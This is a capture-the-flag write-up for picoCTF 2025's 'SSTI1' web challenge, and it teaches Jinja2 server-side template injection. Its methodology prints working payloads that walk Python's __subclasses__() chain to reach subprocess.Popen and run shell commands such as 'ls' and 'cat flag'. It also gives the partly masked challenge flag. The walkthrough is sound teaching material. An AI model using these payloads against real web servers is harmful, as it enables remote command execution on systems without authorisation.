
## SSTI1

**Platform:** picoCTF 2025

**Author:** VENAX

**Category:** Web Exploitation

**Difficulty:** Easy

Tags:
#picoCTF_2025
#Web_Exploitation 
#Easy 

---

## Description

I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.

http://rescued-float.picoctf.net:62021/

---

## Hints
- Server Side Template Injection

---

## Analysis

When interacting with the page, any submitted text is rendered on another page—suggesting the backend may be using a template engine such as Jinja2 (common in CTF web challenges).  
SSTI occurs when user input is embedded directly into a template without sanitization, allowing execution of template expressions.

Testing payload `{{7*7}}` returns `49`, confirming Jinja2 code execution.  
Once confirmed, the next step is to expand the payload to achieve RCE or at least read sensitive variables, which typically includes the flag.

---

## Methodology

**Step 1:** Test for SSTI
Input a harmless template expression:
`{{7*7}}`

If the output page displays `49`, SSTI is confirmed.


**Step 2:**  Escalate to object exploration
To inspect the environment, use a Jinja2 introspection payload:

`{{ [].__class__.__mro__[1].__subclasses__() }}`

This returns a list of Python subclasses.  
Scan for useful modules like `<class 'subprocess.Popen'>` or file-handling classes.

**Explanation:**

- `[]` is a list
- `.__class__` → `<class 'list'>`
- `.__mro__` lists its inheritance chain
- `[1]` selects `<class 'object'>`
- `.__subclasses__()` returns **all classes loaded in Python memory**

This list contains file handlers, functions, exception classes, and critically:  
**`<class 'subprocess.Popen'>`**, which allows OS command execution.


**Step 3:** Find the index of subprocess.Popen
Use this payload to enumerate indexes with their class names

`{{ [].__class__.__mro__[1].__subclasses__() }}`

But it's very long.  
Instead, try checking indexes individually until you find the one matching


```
{{ ''.__class__.__mro__[1].__subclasses__()[300] }}
{{ ''.__class__.__mro__[1].__subclasses__()[310] }}
{{ ''.__class__.__mro__[1].__subclasses__()[320] }}
{{ ''.__class__.__mro__[1].__subclasses__()[330] }}
{{ ''.__class__.__mro__[1].__subclasses__()[340] }}
{{ ''.__class__.__mro__[1].__subclasses__()[350] }}
{{ ''.__class__.__mro__[1].__subclasses__()[356] }}
```

modify the index until you see: 

`<class 'subprocess.Popen'>`

This tells us which subclass exposes OS-level command execution.


**Step 4:** Execute a Shell Command

`{{ ''.__class__.__mro__[1].__subclasses__()[X]('ls', shell=True, stdout=-1).communicate() }}`

Add the right index  `[356]`

`{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate() }}`


**Explanation of arguments:**

- `'ls'` → command to run
- `shell=True` → required to run the command through `/bin/sh`
- `stdout=-1` → captures the output
- `.communicate()` → returns process output

This confirms the flag file exists and is readable.


This should return something like:

`(b'__pycache__\napp.py\nflag\nrequirements.txt\n', None)`


**Step 5:** Read the Flag

Once you confirm the filename, run:

`{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate() }}`

The payload works exactly like the previous one, but replaces `ls` with `cat flag` to display the file contents.

This will print the contents of the flag.

---

## Flag

picoCTF{s4rv---------a99a}

---

## Reflection

This challenge is an excellent introduction to **Server-Side Template Injection (SSTI)**. It demonstrates how even minimal web apps that render user input dynamically can be exploited if input is not sanitized. The exploitation workflow involved confirming SSTI, exploring the Python environment, identifying a powerful class (`subprocess.Popen`) for command execution, and finally reading the flag. Through this, we see how simple template injection can escalate to full server access, underscoring the importance of validating and escaping user inputs in server-side templates. For beginners, it is a practical example of how SSTI works in real-world web applications.


---

## Tools
**Jinja2 Payload Cheatsheet** – Provided pre-built template injection payloads for quick testing.

**Python Introspection Knowledge** – Understanding `__class__`, `__mro__`, and `__subclasses__()` to enumerate objects and execute code.


----

## References

[SSTI](https://portswigger.net/web-security/server-side-template-injection)

